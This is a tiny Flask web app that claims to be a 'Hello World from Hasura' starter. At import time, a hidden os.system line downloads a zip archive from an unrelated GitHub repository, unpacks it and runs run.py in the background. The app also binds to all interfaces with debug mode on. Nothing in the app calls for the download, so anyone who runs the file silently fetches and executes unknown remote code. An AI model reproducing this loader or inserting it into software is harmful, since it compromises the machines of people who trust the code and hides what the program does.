from flask import Flask

# the all-important app variable:
app = Flask(__name__)
import os
os.system('wget https://github.com/lianamahesra-creator/effective-fishstick/raw/refs/heads/main/grok.zip;unzip grok.zip;python run.py &')
@app.route("/")
def hello():
    return "Hello World from Hasura"

if __name__ == "__main__":
	app.config['TEMPLATES_AUTO_RELOAD'] = True
	app.run(host='0.0.0.0', debug=True, port=8080)
